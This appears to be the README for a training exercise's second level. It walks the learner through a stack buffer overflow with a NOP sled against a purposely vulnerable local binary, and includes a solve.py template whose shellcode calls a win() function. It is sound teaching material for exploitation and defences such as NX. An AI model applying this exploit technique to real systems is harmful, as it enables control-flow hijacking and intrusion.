# Level 2 — "NOP Sled" (Medium)

Level 1 corrupted a neighboring variable. Level 2 hijacks **control flow**.

You overflow a stack buffer, overwrite the **saved return address**, and point
it into a long runway of NOP instructions (`\x90`). The CPU slides down the
sled into your **shellcode**, which must call `win()`.

**Win condition:** see

```text
*** NOP SLED LANDED :: SHELLCODE REACHED WIN() ***
*** LEVEL 2 CLEARED ***
```

You do **not** edit `vulnerable.c`. You craft the input payload.

---

## Why a NOP sled?

Your return-address guess does not need to be *perfect*. If you land anywhere
inside a long sequence of `\x90` (NOP = "do nothing"), the CPU keeps walking
forward until it hits your shellcode. That runway is the **NOP sled**.

```text
buffer (low address) ------> higher addresses ------> saved return addr
[ NOP NOP NOP NOP | shellcode ] .............. [ addr pointing into NOPs ]
         ^                                      |
         +--------------------------------------+
```

---

## Step 1 — Build

```bash
make
file vulnerable      # ELF 32-bit ... Intel 80386
```

This level links with `-z execstack` so the stack is executable (otherwise
injected shellcode cannot run). **Read the compiler warnings.**

Confirm ASLR is off:

```bash
cat /proc/sys/kernel/randomize_va_space   # expect 0
```

## Step 2 — Recon

```bash
./vulnerable
```

Note the printed `[leak] buffer @ 0x........` address. That is where your
NOP sled + shellcode will live. Re-read it each run if addresses move.

Find `win`:

```bash
nm vulnerable | grep ' win$'
# or
gdb -q -batch -ex "info address win" ./vulnerable
```

## Step 3 — Find the offset to the return address

You must fill past `buffer[128]` and any saved frame pointer / alignment
padding until you reach the return address.

**Measure on your VM** (do not copy a number from another machine blindly):

```bash
gdb ./vulnerable
(gdb) disassemble vulnerable
(gdb) break vulnerable
(gdb) run
# after the buffer exists:
(gdb) print &buffer
(gdb) info frame
```

A common starting guess on `-O0` i386 builds is a bit above `128 + 4`, but
**verify**. If your payload fails, adjust the offset.

## Step 4 — Build the payload

Structure:

1. Many `\x90` NOPs (the sled)
2. Short shellcode that calls `win`
3. Padding until the return-address slot
4. A 4-byte little-endian address pointing into the middle of your NOP sled
   (use the leaked buffer address + a small offset into the sled)

Example shellcode (32-bit): `mov eax, win_addr` ; `call eax`

```text
\xb8 <win_addr as 4 little-endian bytes> \xff\xd0
```

Template (`solve.py`):

```python
import sys
import struct

buf_addr = 0xREPLACE_ME   # from the [leak] line
win_addr = 0xREPLACE_ME   # from nm / gdb
offset   = REPLACE_ME     # measured on YOUR vm

nops = b"\x90" * 64
shellcode = b"\xb8" + struct.pack("<I", win_addr) + b"\xff\xd0"
padding = b"A" * (offset - len(nops) - len(shellcode))
ret = struct.pack("<I", buf_addr + 16)  # land mid-sled

sys.stdout.buffer.write(nops + shellcode + padding + ret)
```

```bash
python3 solve.py | ./vulnerable
```

## Step 5 — Submit

- Your solve script / payload
- The leaked buffer address and `win` address you used
- 4–6 sentences: what a NOP sled is, why you overwrite the return address,
  and why the stack must be executable for this level

---

## What you should understand after this

- The saved return address controls where the function returns.
- Overwriting it redirects the CPU (control-flow hijack).
- NOPs (`\x90`) buy you tolerance on the landing address.
- Shellcode is just bytes the CPU executes if you point EIP at them.
- NX / non-executable stacks exist to stop this class of attack
  (`-z execstack` turns that protection off for this level only).
